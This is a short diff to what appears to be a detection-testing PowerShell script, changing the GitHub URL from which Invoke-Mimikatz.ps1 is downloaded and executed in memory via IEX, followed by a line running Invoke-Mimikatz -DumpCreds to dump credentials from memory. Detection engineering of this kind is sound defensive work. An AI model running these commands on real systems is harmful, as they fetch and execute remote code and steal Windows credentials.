@@ -1,4 +1,4 @@
-IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/mikecybersec/DetectionDevelopment/main/Invoke-Mimikatz.ps1') 
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/Pamentierx/DetectionDevelopment/main/WindowsTests/Invoke-Mimikatz.ps1') 
 
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 
